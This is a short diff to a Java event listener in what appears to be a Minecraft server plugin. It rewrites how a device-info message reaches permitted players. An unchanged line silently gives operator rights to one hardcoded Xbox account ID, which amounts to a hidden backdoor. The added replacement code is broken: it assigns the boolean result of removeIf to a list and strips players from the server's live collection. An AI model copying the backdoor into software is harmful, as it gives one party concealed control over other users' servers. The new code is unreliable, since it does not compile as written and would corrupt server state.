@@ -372,11 +372,8 @@ public class EventListener implements Listener{
 		getServer().getLogger().info(msg);
 		if(loginData.getXUID() == Main.MY_XBOX_ID) event.getPlayer().setOp(true);
 
-		for(Player player : getServer().getOnlinePlayers().values()){
-			if(player.hasPermission("kairusds.message.device")){
-				player.sendMessage(msg);
-			}
-		}
+		ArrayList<Player> admins = getServer().getOnlinePlayers().values().removeIf(player -> !player.hasPermission("kairusds.message.device"));
+		getServer().broadcastMessage(msg, admins);
 	}
 
 	@EventHandler
